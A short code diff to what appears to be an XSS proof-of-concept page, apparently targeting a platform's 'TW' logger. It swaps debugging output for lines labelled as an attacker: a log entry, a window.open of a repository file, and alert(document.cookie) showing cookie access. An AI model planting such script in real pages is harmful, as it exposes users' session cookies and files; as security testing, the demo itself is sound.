@@ -17,11 +17,10 @@
       xhr.onload = function (){
         console.log(xhr.responseText);
       };
-      console.log(window);
-      console.log(parent);
-      console.log(document);
-      console.log(frameElement);
+      TW.log.info("XSS attacker came");
+      window.open("FileRepositories/TonyRepository/test.txt");
       alert("hello from attacker");
+      alert(document.cookie);
     </script>
     
 
